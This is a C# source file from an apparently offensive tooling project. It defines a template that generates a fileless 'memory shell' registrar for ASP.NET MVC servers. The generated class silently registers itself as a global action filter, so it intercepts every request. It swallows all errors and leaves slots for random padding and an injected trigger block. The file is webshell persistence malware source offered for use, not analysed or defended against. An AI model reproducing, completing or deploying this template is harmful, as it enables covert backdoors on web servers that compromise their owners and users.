namespace NMG.Templates;

/// <summary>
/// MVC GlobalFilter memory shell registrar template.
/// Registers a filter that intercepts requests at the MVC pipeline level.
/// Requires System.Web.Mvc assembly on the target.
/// C# 2.0 compatible syntax.
/// </summary>
public static class MvcFilterTemplate
{
    public const string Source = """
        using System;
        using System.Reflection;
        using System.Text;
        using System.Web;
        using System.Web.Mvc;

        namespace {{NAMESPACE}}
        {
            public class {{CLASSNAME}} : ActionFilterAttribute
            {
        {{MEMBERS}}

                static {{CLASSNAME}}()
                {
                    try
                    {
                        {{CLASSNAME}} filter = new {{CLASSNAME}}();
                        GlobalFilters.Filters.Add(filter);
                        load = true;
                    }
                    catch (Exception)
                    {
                    }
                }

                public {{CLASSNAME}}()
                {
                }

        {{RANDOM_STRING}}

                public override void OnActionExecuting(ActionExecutingContext filterContext)
                {
                    try
                    {
                        HttpContext.Current.Application.Contents.Count.ToString();
                {{TRIGGER_BLOCK}}
                    }
                    catch (Exception)
                    {
                    }
                }

                public override void OnActionExecuted(ActionExecutedContext filterContext)
                {
                }

                public override void OnResultExecuting(ResultExecutingContext filterContext)
                {
                }

                public override void OnResultExecuted(ResultExecutedContext filterContext)
                {
                }
            }
        }
        """;
}
